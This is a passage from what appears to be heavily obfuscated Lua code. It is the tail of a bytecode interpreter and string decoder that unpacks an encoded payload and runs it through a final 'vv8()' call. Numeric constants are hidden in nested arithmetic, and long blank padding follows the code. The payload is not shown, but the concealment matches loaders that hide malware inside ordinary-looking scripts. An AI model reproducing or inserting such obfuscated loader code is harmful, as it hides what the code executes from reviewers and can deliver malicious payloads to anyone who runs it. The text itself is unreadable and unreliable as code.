+ 937)))) then local v175=673 -(419 + 254);local v176;while true do if ((v175==0) or ((3932 -(148 + 54 + 939))<(1463 -(118 + (1956 -(1105 + 241)))))) then v176=v93[2 -0];v91[v176]=v91[v176]();break;end end else v91[v93[1600 -(291 + 587 + 720)]]=v91[v93[1745 -(368 + 1374)]];end elseif ((v94>(2 + 23)) or ((4974 -(80 + 895))<=(312 + 596))) then v91[v93[482 -(101 + 379)]]=v35[v93[3]];else local v179=(77 -(13 + 64)) + 0;local v180;local v181;while true do if ((v179==(0 -0)) or (2285>=(13472 -(10989 -(913 + 35))))) then local v207=0 + 0 + 0;while true do if (((1 + 0)==v207) or ((4544 -((87 -54) + 73))==(1062 + 2079))) then v179=1 + 0;break;end if (((0 -0)==v207) or ((184 -93)>2133)) then v180=0 + 0;v181=nil;v207=1 + 0;end end end if ((v179==1) or (3160>=4719)) then while true do if ((v180==(1278 -((2533 -(223 + 1349)) + 317))) or ((1705 + 479)<(3021 -2272))) then v181=v93[2 + 0];v91[v181]=v91[v181](v12(v91,v181 + 1 + 0,v93[3]));break;end end break;end end end elseif (((186 + 1935)<((8354 -(267 + 1298)) -(1715 + 263))) and (v94<=((314 + 292) -(452 + 126)))) then if ((3460<=(5017 -(897 + 646))) and (v94==((52 -38) + 13))) then local v182=1762 -(1108 + (2174 -(297 + 1223)));local v183;local v184;local v185;while true do if (((12027 -8514)>=((2535 + 3272) -3554)) and (v182==(0 + (0 -0)))) then v183=v93[2 + 0];v184=v91[v183];v182=893 -((691 -274) + 475);end if ((v182==(1 + 0)) or (((7820 -(280 + 1027)) -4573)>3900)) then v185=v93[1188 -(43 + 1142)];for v212=2 -1,v185 do v184[v212]=v91[v183 + v212];end break;end end else v35[v93[3]]=v91[v93[1906 -((790 -355) + 1469)]];end elseif ((4808>2974) and (v94>(91 -62))) then v91[v93[1 + 1]]= #v91[v93[(3 + 3) -3]];else local v188=0 -0;local v189;local v190;local v191;while true do if ((3249<=(21636 -17123)) and (v188==(1540 -(953 + (849 -263))))) then v191=nil;while true do if ((v189==(99 -(41 + 58))) or ((3553 -(293 + 358))<(514 + 648))) then local v230=0;while true do if (((2632 + 345)==2977) and ((3 -(1 + 1))==v230)) then v189=(1 -0) + 0;break;end if ((4727>1657) and (v230==((0 -0) + 0))) then v190=v93[2];v191=v91[v93[547 -(323 + 221)]];v230=3 -2;end end end if ((v189==(2 -(1 + 0))) or (1995==(2923 -(221 + 171)))) then v91[v190 + 1]=v191;v91[v190]=v191[v93[1820 -(1231 + 143 + 442)]];break;end end break;end if (((204 + 1621)<=(5120 -(142 + 198))) and (v188==(1840 -(81 + 1759)))) then v189=0;v190=nil;v188=(2 + 1) -2;end end end v70=v70 + ((1448 -537) -(789 + 121));break;end end end end v69=3;end end end;end return v29(v28(),{},v16)();end if (5==v17) then v26=v23;v27=nil;function v27(...)return {...},v11("#",...);end v17=6;end if (0==v17) then v18=1;v19=nil;v15=v4(v3(v15,5),"..",function(v36)if (v1(v36,2)==79) then v19=v0(v3(v36,1,1));return "";else local v75=0;local v76;while true do if (v75==0) then v76=v2(v0(v36,16));if v19 then local v95=v5(v76,v19);v19=nil;return v95;else return v76;end break;end end end end);v17=1;end if (v17==2) then function v21()local v55=v1(v15,v18,v18);v18=v18 + 1;return v55;end v22=nil;function v22()local v56=0 -0;local v57;local v58;while true do if ((1 + 0)==v56) then return (v58 * (754 -498)) + v57;end if (v56==(0 + 0)) then v57,v58=v1(v15,v18,v18 + (4 -2));v18=v18 + (3 -(1370 -(1008 + 361)));v56=1 + 0;end end end v17=3;end if (v17==4) then function v24()local v59=v23();local v60=v23();return (( -(1 + 1) * v20(v60,54 -22)) + (3 -2)) * ((6 -4)^(v20(v60,15 + 6,85 -54) -(826 + 197))) * ((((v20(v60,1 + 0,(621 + 813) -(346 + 1068)) * ((1 + 1)^(1 + 31))) + v59)/((2 + 0 + 0)^(44 + 8))) + (2 -1));end v25=nil;function v25(v37)local v61;if  not v37 then v37=v23();if (v37==0) then return "";end end v61=v3(v15,v18,(v18 + v37) -(488 -(248 + 239)));v18=v18 + v37;local v62={};for v63=2 -1, #v61 do v62[v63]=v2(v1(v3(v61,v63,v63)));end return v6(v62);end v17=5;end end end vv8());end
















                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
